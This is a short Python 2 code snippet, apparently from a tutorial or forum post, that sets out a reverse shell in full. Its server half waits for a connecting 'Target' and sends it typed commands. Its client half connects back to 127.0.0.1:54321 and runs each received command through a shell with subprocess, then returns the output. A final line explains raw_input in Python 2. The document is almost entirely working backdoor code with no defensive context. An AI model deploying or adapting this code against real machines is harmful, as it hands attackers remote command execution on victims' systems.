------------------------ Server Code ---------------
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("127.0.0.1",54321))
s.listen(5)
print("Listening for Incoming Connections")
target,ip =s.accept()
print("Target is Connected")
while True:
    command = raw_input("Enter your Command:")
    target.send(command)
    if command == "q":
        break
    else:
        result = target.recv(1024)
        print(result)
s.close()


--------------------- Client Code -------------------
import socket
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1",54321))
print("The connetion is Established to Server")
while True:
    command= sock.recv(1024)
    if command== "q":
        break
    else:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        result = proc.stdout.read() + proc.stderr.read()
        sock.send(result)

sock.close()


Note : Don't use input instead of raw_input as above code for python 2x





